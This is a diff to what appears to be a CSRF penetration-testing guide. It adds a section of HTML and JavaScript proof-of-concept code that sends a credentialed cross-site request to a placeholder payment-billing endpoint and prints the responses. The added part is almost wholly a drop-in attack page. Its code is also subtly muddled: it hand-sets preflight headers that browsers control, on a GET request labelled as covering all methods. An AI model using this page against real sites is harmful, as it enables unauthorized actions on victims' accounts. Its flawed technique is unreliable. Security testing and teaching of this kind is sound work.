@@ -18,6 +18,7 @@
    - [Lax Bypass Via Method Override](#Lax-Bypass-Via-Method-Override)
    - [Strict Bypass Via Client Side Redirect](#Strict-Bypass-Via-Client-Side-Redirect)
 5. [Notes](#Notes)
+6. [CSRF Exploit For All Method](#CSRF-Exploit-For-All-Method)
 ---
 
 ## Testing CSRF Token
@@ -240,5 +241,38 @@ console.log(document.cookie);
   
 
 <img width="1116" height="348" alt="Screenshot From 2025-07-26 22-36-29" src="https://github.com/user-attachments/assets/39b890d4-b65a-47f4-8a0b-14208a1b5342" />
+
+### CSRF Exploit For All Method
+
+```js
+<!doctype html>
+<html>
+  <body>
+    <h3>Testing CSRF</h3>
+    <script>
+      (async function(){
+        const target = 'https://www.target.com/payment/recurring-billing/?checkout=4606715';
+        try {
+          const resp = await fetch(target, {
+            method: 'GET',
+            credentials: 'include',
+            headers: {
+              'Access-Control-Request-Method': 'DELETE',
+              'Access-Control-Request-Headers': 'content-type, x-requested-with'
+            }
+          });
+          console.log('METHOD status:', resp.status);
+          console.log('Headers:'); for (const [k,v] of resp.headers) console.log(k, v);
+          alert('Success — check console.');
+        } catch (e) {
+          console.error(e);
+          alert('Failed — see console.');
+        }
+      })();
+    </script>
+  </body>
+</html>
+
+```
 
 ---
